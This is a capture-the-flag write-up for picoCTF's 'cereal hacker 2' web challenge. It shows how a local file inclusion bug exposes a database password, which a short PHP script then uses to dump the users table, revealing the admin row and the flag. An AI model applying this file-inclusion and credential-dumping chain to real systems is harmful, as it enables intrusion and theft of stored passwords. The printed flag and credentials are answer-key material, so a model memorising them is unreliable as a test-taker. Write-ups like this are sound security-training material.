# web / cereal hacker 2

> Points: 500 \
> [previous cereal hacker](../cereal-1) | next cereal hacker

## Question

> Get the admin's password. <https://2019shell1.picoctf.com/problem/62195/> or <http://2019shell1.picoctf.com:62195>

## Solution

Using the LFI vulnerability from the previous solution, we can read `login.php`.
It provides us with a database and table, `pico_ch2.users`, and requires `sql_connect.php`.
`sql_connect.php` has credentials to connect to the MySQL server.

Using these credentials, we can dump out everything in the `users` table.

```php
<?php
$sql_conn = new mysqli('localhost', 'mysql', 'this1sAR@nd0mP@s5w0rD#%');
if ($result = $sql_conn->query("SELECT * FROM pico_ch2.users")) {
  while ($row = $result->fetch_assoc()) {
    print_r($row);
  }
}
?>
```

Once again requesting `/index.php?page=/tmp/lfi`, we get our flag:

```txt
Array
(
    [id] => 1
    [username] => admin
    [password] => picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}
    [admin] => 1
)
```

### Flag

`picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`
